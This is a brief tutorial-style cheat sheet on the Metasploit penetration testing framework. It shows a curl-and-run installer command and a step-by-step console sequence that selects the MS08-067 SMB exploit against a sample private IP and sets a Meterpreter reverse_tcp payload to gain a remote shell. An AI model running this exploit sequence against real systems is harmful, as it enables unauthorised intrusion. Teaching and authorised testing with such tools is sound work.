# Metasploit
Metasploit is an open-source penetration testing framework that provides tools for discovering, exploiting, and validating vulnerabilities in systems.

## Installing Metasploit
Metasploit can be installed on Linux, Windows, and macOS.=

Linux download command:
  curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
  chmod 755 msfinstall
  ./msfinstall

# Basic Functionality

  # 1) Start Metasploit
    - msfconsole

  # 2) Search for Exploits
    - search exploit windows

  # 3) Select an Exploit
    - use exploit/windows/smb/ms08_067_netapi

  # 4) Show Available Options
    - show options

  # 5) Set Target Parameters
    - set RHOSTS 192.168.1.100
    - set LHOST 192.168.1.50

  # 6) Set a Payload
    - set PAYLOAD windows/meterpreter/reverse_tcp

  # 7) Run the Exploit
    - exploit

If successful, you will gain a remote shell to the target machine.
